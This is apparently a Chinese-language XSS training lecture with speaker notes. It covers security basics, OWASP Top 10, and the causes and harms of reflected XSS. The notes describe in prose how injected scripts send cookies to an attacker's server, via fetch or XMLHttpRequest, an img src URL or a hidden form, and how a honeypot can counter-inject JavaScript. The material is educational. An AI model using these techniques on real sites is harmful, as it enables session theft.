# XSS的原理及危害

---

1.也就是xss课程的相关讲解，咱们今天讲的内容和我们靶场的练习来巩固一下。
因为xss还是与开发有关系，还是从一个大背景下引入咱们的xss。
——————————————————————————————————————————————————————
2.而XSS作为Web应用中主流的攻击方式之一，它的危害性和普遍性不容忽视。
3.首先，它是一种利用了Web应用中的计算机安全脆弱性，形成的一种漏洞。
它可能引起我们用户的资料被盗取、黑客利用用户身份进行一些破坏的行为，或者对用户进行计算机病毒侵害。这种攻击方式不仅威胁到用户的隐私和安全，还可能对Web服务造成严重的破坏。——————————————————————————————————————————————————————
      那我们在座的有没有自学过或者了解过开发的，我本身之前也是一直从事后台开发的工作，其实我们开发角度而言，很多的安全问题是被我们忽视的，我们工作过程中，一般考虑这个功能模块是不是完成了，或者我们的性能是不是存在瓶颈，我们怎么解决这些存在瓶颈的问题，比如像redis中间件，数据库，代码调优，但是在实际业务当中，关于安全方面的隐患也是经常出现的，有些时候可能是我们编程过程中一些框架甚至是一些组件都自带防御手段，但是现在随着越来越多的技术先进，黑客其实也不断提高他们的技术，那我们这安全方面也一定不能忽视。那我们看一下今天的课程大纲。

# 目录

---

那我们的课程大纲呢，一共分为了这样的几个章节咱们一起去学习
       首先，我们来了解一些基本概念，包括一些网络安全、web应用安全等相关的概念、以及最重要的XSS攻击的原理和相关的类型，我也会通过一些事例带着大家看一下一些常见的来检测xss的方式，也会给大家时间去我们的训练场练习一下有关习题，同时我们也要掌握防御XSS的相关方法，可以让我们在面对潜在的xss网络安全威胁时，能够迅速有效地采取应急保护措施，使我们的系统和数据不受侵害。


相关基本概念

01

---

       首先我们应该了解一下相关的基本概念，大家肯定都对这些概念非常熟了，我们简单过一下看看

# 网络安全 – 网络安全定义

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411270.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411271.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411272.jpg)

保证信息在传输、存储和处理过程中不被篡改或破坏。

确保授权用户能够随时访问和使用所需的信息和系统服务。

确保信息只为授权用户所使用，防止非授权用户获取敏感信息。

---

1.首先来看一下什么是网络安全？
————————————————————————————————————————————————————————
       网络安全到底是什么？指的是网络系统的硬件、软件及其系统中的数据受到保护，不会因为偶然的或者恶意的原因而遭受到破坏、更改、泄露 /我们的系统能连续、正常地运行，网络服务不出现中断情况。
 ——————————————————————————————————————————————————————
      其实网络安全是强调了多个方面，但是我们最核心的概念还是围绕这三点来谈的。
也即是ppt中这仨个特性保密性、完整性和可用性。      
保密性：以及我们开发角度上，一些权限保密、就是API接口的保密性
完整性：对于完整性的定义一是我们数据的完整性（像cookie、session等）、还有语义完整性：语义完整性是确保数据在逻辑上一致和正确的   
可用性:  就是我们的系统或者服务可用、相关组件出现瓶颈时，我们作为开发能有调优能力。我们之后很多的内容都围绕这三个特性进行的。

# 网络安全 – 网络安全重要性

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411273.jpg)

网络安全能防止个人信息泄露，如银行账户、密码等，保障用户隐私安全。

网络攻击可能威胁国家安全，网络安全措施能有效防御外部网络入侵，保护国家机密。

网络安全为电子商务和在线交易提供保障，是数字经济健康发展的基石。

---

      网络安全的重要性可想而知，像我们的支付过程中，我们的个人信息如姓名、地址、电话号码、银行账户，那这些信息经常在网络上传输和存储。我们采取相应的网络安全措施，能够确保这些信息不被未经授权的第三方获取，从而保护个人隐私。
     咱们现实生活中：我们现在手机经常都能收到一些的短信提示，告诉我们不要轻易的扫码、点击链接等等了；还有咱们国家反诈中心的app，来让我们预防我们个人隐私被窃取的。
    国家层面就更不用说了，网络安全是咱们国家安全的重要组成部分，像黑客攻击、恶意软件等网络威胁可能破坏关键基础设施，如电力、交通、通信等，进而威胁国家安全。
    最后一点尤其是在咱们国家，电子商务市场规模一直占据全球网络零售市场领先地位，网络安全其实是建立咱们用户信任的基础，只有这些基础都能保证，才能发展我们的经济。

# 网络安全 – 网络安全目标

防止敏感信息泄露给未授权的个人或系统，例如政府机构对机密文件的加密存储。

确保授权用户能够及时、可靠地访问信息资源，例如防止DDoS攻击导致的服务拒绝。

确保数据在传输和存储过程中不被未授权地修改或破坏，如银行交易数据的完整性保护。

---

那我们看一下我们网络安全的目标
那一定就是对网络安全三个重要特性而言的。
1首先，确保网络系统中的数据和信息不被未经授权的用户访问。这包括像敏感的个人信息、商业机密和政府信息。那目标就是只允许授权用户访问和使用这些信息，防止被滥用。
2.那完整性确保网络系统中的数据和信息，在没授权的情况下不能被篡改；保持数据的准确性和真实性。
3.可用性的目标保证网络系统以及网络服务是始终可用。确保网络资源和服务能够及时、可靠地提供给用户，避免因为黑客攻击、或者硬件故障等其他因素，导致的网络中断或服务中断。

# web安全 – 含义

<span style="color:#000000">Web安全涉及保护用户数据不被未授权访问或泄露，如个人隐私和交易信息。</span>

<span style="color:#000000">确保网站不被恶意软件利用，防止用户在访问时受到病毒、木马等软件的攻击。</span>

<span style="color:#000000">保障网站服务的连续性和稳定性，防止DDoS攻击等导致的服务中断。</span>

---

那么说完了网络安全，我们来看一下web安全
       那什么是web安全呢，Web安全是网络安全技术中一个非常重要的领域，它是专注于保护网站和Web应用程序相关的安全，它确保我们的Web应用程序和网站免受恶意攻击者的攻击；以及保护Web服务器和客户端之间的数据传输是正常的。
随着现在互联网产品的广泛应用，Web业务的迅速发展也引起了黑客的强烈关注，所以现在Web安全威胁日益凸显，我们也可以理解为关注的人越多，想利用的人就越多。
3.Web安全无论是对企业和我们个人用户来讲都非常的重要。
      对于个人用户而言，Web安全关系到个人隐私和财产安全，一旦个人信息被泄露或滥用，将带来不可估量的损失。
      对于企业而言，Web应用是其业务的核心资产部分，一旦遭受攻击，可能导致数据泄露、业务中断等严重后果，会影响我们企业的这个声誉以及利益。


# web安全 – 威胁类型

<span style="color:#FFFFFF">XSS攻击通过注入恶意脚本到网页中，盗取用户信息或破坏网站功能，如社交网站上的钓鱼攻击。</span>

<span style="color:#FFFFFF">攻击者通过在Web表单输入恶意SQL代码，试图操纵后端数据库，例如通过注入代码窃取用户数据。</span>

<span style="color:#FFFFFF">CSRF利用用户对网站的信任，诱使用户执行非预期的操作，如在不知情的情况下发送邮件或转账。</span>

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411274.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411275.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411276.jpg)

---

      Web的威胁类型是多种多样的，涵盖了从一些简单的攻击到更复杂的多步骤攻击，甚至还有一些多种威胁的组合利用等等；这涉及到我们用户、服务器、应用程序和网络等多个方面。
      像我们今天的要学习的重点,也就是XSS跨站脚本攻击，大家在之前的也学习过的sql注入、服务器端请求伪造、XML外部实体攻击等等吧，有很多种。

# web安全 – 安全防护措施

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411277.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411278.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-202411279.png)

CSP是一种额外的安全层，帮助检测并减轻某些类型的攻击，如跨站脚本\(XSS\)和数据注入攻击。

定期的安全审计可以发现网站的安全漏洞，及时修补，确保网站安全防护措施的有效性。

HTTPS通过SSL/TLS加密数据传输，保护网站与用户之间的通信安全，防止数据被窃取或篡改。

---

      那说完了常见的一些威胁，我们看一看web安全需要用什么样的防护措施，我列举了几个，但不限于这几种措施、还有像一些硬件，waf应用防火墙等等吧
      像第一个，使用https协议，HTTPS其实是在HTTP的基础上加入了加密层，保护我们的数据在传输过程中被加密，并通过数字证书来验证服务器的身份，保障通信的安全性。它的出现其实表示我们可以通过互联网可以进行商业的活动，像在互联网上进行了支付和交易==；电子商务网站、在线银行以及需要用户身份验证的网站等也都采用HTTPS来保障用户数据的安全。
      我之前做开发的时候呢，我们是与银行之间有相关的业务往来，在对接他们系统的时候，我们技术首先拿到他们的接口文档，先看一下接口的通讯协议，因为我们公司内部有严格要求规定，如果对方系统使用的是http协议，我们这个对接工作先暂停，反馈给我们的商务部门去与对方沟通能否升级为https协议，如果确实不能升级，那么抱歉，这个项目先暂停，我们一切的一切都要把保证我们的安全为首位的。
因为安全无小事，我们在初期就要进行一个严格的把控。

# 基本概念 – OWASP组织简介

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112710.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112711.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112712.jpg)

<span style="color:#262626">OWASP是一个全球性的非盈利组织，致力于提升软件安全，通过教育、工具和会议等方式推动安全实践。</span>

<span style="color:#262626">OWASP在全球拥有众多分会和志愿者，其发布的安全标准和指南被广泛应用于全球的网络安全领域。</span>

<span style="color:#262626">OWASP提供了大量免费的安全资源，包括安全指南、代码库和开源工具，帮助开发者和组织提升应用安全。</span>

---

      再接下来给大家看一下组织吧，欧WASP，  它是一个全球性的非营利组织，致力于提高我们软件的安全性。也提供了各种免费资源呀、工具和文档，帮助我们开发人员、还有一些组织和安全专家用来识别、修复、预防Web应用程序中的安全一些问题。
      OWASP呢在全球有很多的分会和志愿者，包含一些网络安全的标准或是指南；给我们从事网络安全的，或者有兴趣的这些人使用，都会使用他们提供的免费资源，来提升我们的应用安全。
      大家有兴趣的也可以关注一下，因为它的项目和指南已经成为全球范围内Web应用程序安全的标准，既然都成为了行业标准，说明它在安全领域里的认可度是相当之高的，很多的安全测试和审计都参考OWASP。不仅为技术专家提供了深入的安全工具，对我们的新手和非技术用户也是非常有好的，提供了很多实用的入门指南。

# 基本概念 – OWASP Top 10目的

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112713.jpg)

OWASP Top 10旨在教育开发者和安全专家，提升对网络应用中最常见和最危险漏洞的认识。

该列表为组织提供了一个框架，帮助他们优先处理和修复那些最有可能被攻击者利用的安全漏洞。

OWASP Top 10推动了全球网络安全标准的制定，鼓励业界采用一致的安全措施来保护网络应用。

---

      我们看一下owasp最著名的项目，owasp top 10，列出了Web应用程序中最常见的十大安全风险，并定期更新。这个十大安全风险是全球Web安全实践的一个重要的参考，我们开发人员和安全从业者会通过这一列表了解到当今最新的安全威胁，然后我们也会随之进行侧重点研究或者学习，从而来提高我们应用的安全性。
      我们知道网络安全是动态的，随着技术的不断更迭，随之而来新的攻击手法、恶意软件和漏洞也在不断涌现，那我们的网络安全措施也必须不断更新和进化，以应对这些新的威胁。
      除了10大安全风险这个项目之外呢，其实owasp还有很多的项目，像之后章节的检测工具一章我们还会遇到owsap其中一个安全测试工具，还有专门用来自动化渗透测试和安全扫描的，等等吧，有很多，时间关系我就不一一介绍了。


# 基本概念 – OWASP Top 10更新周期

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112714.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112715.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112716.jpg)

OWASP Top 10每几年进行一次全面审查和更新，以反映最新的网络安全威胁。

更新周期内，OWASP鼓励全球安全专家参与讨论和投票，确保列表的准确性和实用性。

每次更新后，OWASP会发布新版本的Top 10，为网络安全领域提供最新的风险指南。

---

       OWASP Top 10它是有一个更新的周期的，并不是特定的固定时间点，它更新的周期大约是每3到4年一次。这个更新频率为了在贴合Web应用安全领域的最新发展和威胁趋势，来确保它始终反映当前最重要的安全风险，因为它就相当于一个标准，好多都是以它为指导的。
       从2003年到2021年，迄今已经进行了7次更新，在这个评选过程中它们会征集来自全球安全专家和组织的建议，了解他们在实际工作中遇到的最常见、最严重的安全问题；它也会通过分析全球漏洞报告数据去汇总、最后去推出它们的一个10大威胁这样一个列表。

# 基本概念 – XSS在OWASP中的位置

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112717.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112718.jpg)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112719.jpg)

<span style="color:#FFFFFF"> __XSS在OWASP Top 10的早期出现__ </span>

<span style="color:#FFFFFF"> __XSS在OWASP Top 10的演变__ </span>

<span style="color:#FFFFFF"> __XSS在OWASP Top 10的最新动态__ </span>

在最近版本，XSS依然位列OWASP Top 10，强调了其持续的威胁和对安全措施的持续需求。

随着时间推移，XSS在OWASP Top 10中的排名不断演变，反映了其攻击手段的更新和防护技术的进步。

2004年，XSS首次出现在OWASP Top 10中，标志着其作为主要网络安全威胁的地位。

---

      自从2003年OWASP Top 10开始发布报告开始，2004年xss首次出现在报告中；之后随着榜单每次的发布，它一直都在top10当中，也是Web应用程序安全领域需要重点关注的漏洞之一。
      尽管具体的排名可能会随着时间和新漏洞的发现而有所变化，但XSS始终被认为是危害较大且普遍存在的安全威胁。
在最新的 OWASP Top 10 (2021) 中，XSS不再作为一个独立的类别出现，而是被归入了更广泛的类别：也就是 Injection（注入），因为XSS本质上属于注入攻击的一种，攻击者通过向应用程序注入恶意脚本来执行未授权的操作。项目本身也倾向于将各种注入攻击统一到一个更广泛的分类中（包括像有SQL注入、命令注入等等所有这种注入类型的威胁），其实就是为了强调这些漏洞都有一个共同性质——那就是不安全的数据输入处理。

# 基本概念 – XSS排名变化

2004年，XSS首次被列为OWASP Top 10安全风险之一，标志着其对网络安全的严重威胁。

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112720.jpg)

近年来，XSS在OWASP Top 10中的排名趋于稳定，持续位于前三，凸显其持续的高风险性。

XSS漏洞的防御难度较大，需要持续关注和更新防御策略，这也是其排名靠前的原因之一。

---

       xss的排名持续位于前列，那么在最新的一期的排名当中也是位于第三名，为什么它的排名一直居高不下，因为它隐蔽性特别强，应对它的防御难度很大，需要我们持续的关注以及更新防御的策略。
       那我们之前我们说了这么多的概念，都是来说xss的重要性，那它目的到底是什么呢，为什么黑客会使用xss攻击呢，，实际上一些越权的操作，一定要拿到管理员信息，黑客通过技术手段拿不出管理员密码，因为我们现在防御手段很多，黑客如果做爆破密码一类的操作，可能刚进行操作，我们就能发现了，那我们这个时候黑客就可能会使用xss去做一个诱导。









      大家应该都听过蜜罐的概念？蜜罐在网络安全领域是一种重要的技术工具，我们用它来进行一些诱捕、检测和分析恶意攻击者的一个重要工具，实际上就是我们故意暴漏一个看似有漏洞的系统，让攻击者攻击，从而对这些攻击行为等等进行收集，通过对这些行为数据分析，做一个溯源。在护网中呢，蓝方不但要对我们的系统重点防护，应急响应与恢复，部署蜜罐收集攻击者的特征，进行溯源，找到对应的攻击者，其实溯源的这个过程很难的。
——————————————————————————————————————————————————————
     在某些高级蜜罐中，其实可以设计反向追踪机制，
     举个例子，当攻击者尝试执行XSS等攻击时，我们注入一个反向的JavaScript代码，通过XSS攻击窃取攻击者设备上的信息，诱使攻击者无意中暴露更多信息；捕获攻击者的行为数据并发送回蜜罐进行分析。那么这其实也是xss从一个产品角度来讲的，也是我们是对xss的利用。

XSS原理及分类

02

---

介绍了这么多的背景和概念，终于到了我们今天的主角，也就是我们的xss，我们首先看一下XSS的概念

# XSS – 定义与原理

<span style="color:#FF0000"> </span>  <span style="color:#FF0000">XSS</span> ，全称Cross\-Site Scripting（跨站脚本攻击），因会与层叠样式表（Cascading Style Sheets，CSS）的缩写混淆，所以大多数情况将跨站脚本攻击缩写为XSS。

它是一种利用网站应用程序的安全 <span style="color:#FF0000">脆弱性</span> ，攻击者将恶意脚本代码嵌入到正常用户会访问到的页面中。当正常的用户访问这些页面时，嵌入的恶意脚本代码会被执行，从而达到攻击用户的目的。这些恶意脚本代码不限于客户端脚本（ <span style="color:#FF0000">JavaScript</span> ），还可能包括插件及等其他脚本语言。

---

我们平时前端开发呢，大多数都是js相关的，所以我们今天讲的一些式例和一些习题都是围绕js脚本进行操作的


“ <span style="color:#FF0000">跨站</span> ”指的是攻击者通过某种方式从一个域影响到另一个域，通常是从攻击者控制的恶意网站影响到用户正常访问的合法网站。

攻击者利用我们访问的网站作为 <span style="color:#FF0000">媒介</span> ，在用户的浏览器注入一个脚本，这个脚本执行来自不同域的操作，可能访问受害者的会话信息、cookie等敏感数据，并将这些数据发送到攻击者的服务器上‌。

---

那到底跨站是什么？为什么要跨站？
      我们先看一下什么是跨站含义？我们先看一下概念
      其实通俗的讲是我们的网站和浏览器之间的信任被利用： 通常情况下，用户在访问一个网站时，浏览器信任该网站并允许网站执行特定的脚本（如JavaScript）以提供动态交互功能。XSS攻击通过篡改或注入恶意脚本，利用了这一信任机制。虽然用户认为自己与可信站点进行交互，但实际上，恶意脚本来自第三方攻击者，而不是该网站本身。
为什么要跨站？黑客收集信息


# XSS – 造成原因

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112721.jpg)

XSS的形成原因主要是用户在与Web应用进行 <span style="color:#FF0000">交互</span> 时，未对交互过程中 <span style="color:#FF0000">输入</span> 做充分的检查和过滤，导致攻击者能够插入恶意脚本。

当Web应用程序动态地渲染用户提交的内容到HTML页面时，如果未对 <span style="color:#FF0000">输出</span> 的内容进行正确的转义和编码，就可能导致恶意脚本执行，使用户加载并执行攻击者恶意制造的网页程序。

---

      这些用户交互包括:一些必填项、富文本、图像视频==这些都有可能成为有隐患的位置
      刚才也提到过，其实开发过程中，通常会忽视掉安全问题，我们的目标是实现我们的功能就可以了；
      表单里的输入框，限制邮箱类型才能提交，这其实就是一种过滤检查，可能正则表达式处理，可能框架帮着处理，在以前的开发项目，前后端不分离的这种系统都是全栈开发维护，就是同时维护前端和后端这种的，为了省时省力啊，这个时候可能就某一端过滤就ok了，但是现在越来越多的都是前后端分离项目，是我们前端人员和后端人员协作一起完成的，面对这些接口数据特殊性问题，从安全角度考虑呢，我们必须保证数据前后端的校验都要严格，前后端都要处理。

# XSS – 实施条件

__1__  __\.能够向Web页面注入__  __恶意脚本__

__1\.1  __  <span style="color:#FF0000"> __用户交互__ </span>  __：__ Web程序必须接受用户的输入，这些输入不仅包括URL中的参数、表单字段，还可能包括HTTP头部和Cookie值等。

__       1\.2  __  <span style="color:#FF0000"> __输入输出校验不足__ </span>  __：__ 如果Web程序没有对用户的输入等进行充分的验证和过滤，攻击者就有可能在这些输入中插入恶意代码。

__2__  __\.__  __恶意脚本能被浏览器执行__

__       2\.1  __  <span style="color:#FF0000"> __注入点__ </span>  __：__ 攻击者需要确保恶意代码被注入到Web页面中的某个位置，这个位置必须能够被浏览器解析和执行。

__       2\.2  __  <span style="color:#FF0000"> __浏览器解释执行__ </span>  __：__ 当Web程序重新显示用户输入的内容时，浏览器会将这些内容解释为HTML标记或JavaScript代码。

---

      我们可以把这个实施条件理解为这个流程，因为开发过程中我们对于某些程序或者功能点，在与用户有交互的地方，对输入过滤和输出转义没有严格控制，导致出现了漏洞，那黑客或者是攻击者呢，通过一些技术手段去找到这个漏洞的位置，（这个漏洞的位置呢，可以被构造恶意的代码），使用他可以执行的脚本进行一个注入。

# XSS – 潜在危害

执行恶意脚本，窃取用户敏感数据，如账号、密码等。

<span style="color:#000000">将用户自动重定向到恶意网站，如钓鱼页面或含有恶意软件的下载链接，使用户进一步遭受安全风险。</span>

<span style="color:#000000">攻击者可能通过XSS漏洞执行恶意操作，如篡改网页内容、传播病毒等。</span>

---

       包括这三个点但不限于这三个点。
       1.信息泄漏：这个漏洞可能会窃取用户敏感信息 ：攻击者可以窃取用户的Cookies或会话ID，从而冒充用户的身份进行未授权的操作。或者是登录凭据窃取：恶意脚本可以伪造登录表单，诱导用户输入他们的用户名和密码，从而把这些关键信息发给攻击者。
      2.恶意重定向：XSS可以将用户自动重定向到恶意网站，如钓鱼页面或含有恶意软件的下载链接，使用户进一步遭受安全风险。
      3.攻击者可以通过脚本模仿用户的行为，在用户不知情的情况下发起请求，进行恶意操作。比如，在用户社交媒体账户上发布内容，或通过电子商务网站进行非法交易。
       还有从破坏网站的完整性角度：恶意脚本可以篡改网页的内容，显示不正确或不合法的信息，从而影响网站的声誉和可信度。     被挂马：今年唐山市的护网当中呢，几个单位，显示一些赌博网站，这种可能对企业形象和声誉造成了影响。———————————————————————————————————————————————————————
     总的来说，XSS的威胁不仅限于用户层面，还可能对整个Web应用的安全性造成严重影响。
     所以有的公司就有严格制度的规定，不要随意点击来历不明的链接。如果一旦被黑客攻击，那么不光是自己有损失，可能公司也受到影响。

# XSS – 方法分类

---

那我们根据它的方法分类，主要分为了这几个类型，那这些不同类型的XSS的攻击机制和影响方式不同。
那我们首先看一下什么是反射型的xss。

# XSS – 反射型

__1\.反射型XSS（__  <span style="color:#FF0000">非持久型</span>  <span style="color:#FF0000">XSS</span>  __）__

XSS 常见于通过 URL 传递参数的功能，如网站搜索、跳转等，并诱骗用户点击该链接。

需要用户 <span style="color:#FF0000">主动打开</span> URL才能生效，恶意代码被发送到服务器，并反射回用户的浏览器执行。

这种攻击方式具有 <span style="color:#FF0000">一次性</span> ，只在用户单击时触发，且跨站代码通常不存储在服务器上。

---

      首先，什么是反射型的xss，先看一下概念
      那联系到我们现实中黑客常用的方式有很多种，仿造官方的钓鱼邮件，还有社交媒体和即时通讯工具，在里面发通常伪装成合法的网站或有趣的内容，如“点击查看您的中奖信息”、“紧急安全更新补丁”等这一类的关键字眼等等。



# XSS – 反射型攻击流程

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112722.png)

---

        那我们黑客如果想要拿到我们一些关键信息啊，像cookie等等这一类的信息，他会怎么做呢？
首先作为黑客，肯定是要去用一些技术手段去检测咱们的这个系统是不是有这样的漏洞，如果有的话，他会需要准备一些行为的脚本。
大家看一下这个流程图：
      第一步，黑客会发送这个带有恶意脚本的链接，刚才我们介绍反射型xss的时候也讲了，他会以一些方式去诱使我们的用户去点击这个链接。那这种我们的用户如果没有辨别直接点击这个链接。
      点击链接之后，正常请求已经到我们的服务器了，并且服务器也给我们用户正常的响应了，但是同时呢黑客的脚本如果触发一些盗取cookie或者别的操作，我们的用户是没有感知的，黑客的恶意脚本把关键的信息通过一个异步的请求发送他能控制的服务器上，那此时，黑客获取到我们的数据之后，就可以为所欲为了。
———————————————————————————————————————————————————————
        咱们刚才讲的这个场景，黑客发送数据到自己的服务器其实是一个跨域的操作，需要绕过我们同源性策略。
———————————————————————————————————————————————————————
      同源性策略是一种浏览器的安全机制，这个策略是为了防止来自不同源的文档或脚本之间的恶意交互。同源策略的定义包括协议、域名和端口号，只有在这三者都相同的情况下，两个页面或资源才被认为是同源的，可以进行交互。否则，它们就被视为不同源，浏览器会阻止它们之间的交互，来防止潜在的安全风险。
———————————————————————————————————————————————————————
       那黑客可以用什么方式绕过同源策略跨域发送数据呢？
       在开发过程中，我们也经常遇到需要解决跨域的问题，一般采用跨源资源共享这种解决方案，有的时候我们为了测试和调试方便，配置任何网站都可以向咱们的服务器发起跨域请求，因为这些配置疏忽。黑客才可能使用的一些方法发送这些数据，像js的ajax提交fetch和mlhttprequest发送get或post；
————————————————————————————————————————————————————
另外，还有使用不受同源策略限制的标签或属性，像是img标签的src属性，可以跨域加载资源，属性的内容设置成黑客的服务器地址，将获取的数据拼接在url后面，然后这个时候可能浏览器渲染的时候，你的图片是404的，但是这个去恶意服务器的请求已经过去了。








      也可能采取了隐藏表单提交的方式，通过在页面动态创建一个隐藏表单，把获取到的数据填充到表单的字段中，发送到黑客的服务器，这是利用表单提交某些情况下不受严格的同源性控制。


# XSS – 反射型特点

不经过服务器存储，就完成一次攻击

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112723.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112724.png)

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112725.png)

反馈率低，所以较难发现和响应修复

---

我们看一下反射型的特点，
      1反射型 XSS 攻击通常是一次性的，攻击者构造一个恶意链接，当受害者点击这个链接时，恶意代码立即执行，它不会被存储在服务器上，因此每次攻击都需要新的请求。
      2通常针对特定用户。这是因为攻击者需要诱使受害者点击特定的链接，这可能涉及社会工程学手段，例如通过电子邮件、社交媒体或即时消息进行传播。黑客可能对人物进行画像，发送定制化的链接，可能根据兴趣爱好，股票，旅游。
      3.攻击常常难以被检测，因为攻击代码是动态构造的，并且直接嵌入在合法的页面请求中，咱们用户是没有感知的，所以隐蔽性很强。

# XSS – 反射型适用情况

![](https://image.201068.xyz/assets%5Cassets%5C%E4%B8%AD%E8%BD%A6%E5%9F%B9%E8%AE%ADXSS%E8%AF%BE%E7%A8%8B%E8%AE%B2%E4%B9%89-%E5%88%98%E9%87%8E-2024112726.jpg)

在搜索查询中插入XSS代码，当查询结果返回时，恶意代码会被执行，影响用户安全。

---

       这种场景是这样的，用户在一个搜索引擎或网站的查询框中输入关键词，查询结果会在页面上动态生成。那如果没有对用户搜索的关键词过滤的话，攻击者可以构造一个恶意链接，当其他用户点击包含恶意脚本的该相关链接时，页面会请求服务器，同时这个恶意脚本被执行。
       这种攻击方式利用了搜索引擎的高流量和用户信任度，使得攻击更加难以防范。
       但是现在利用搜索引擎或大型的网站查询框进行反射型攻击的情况在现代 web 开发中确实变得相对较少，因为安全意识提升，还有当今开发的时候我们使用了一些框架和第三方库，自带xss的校验，但是还是存在一些风险，如果真的使用的第三方库或者框架出现了很大的漏洞，那影响将是很大的

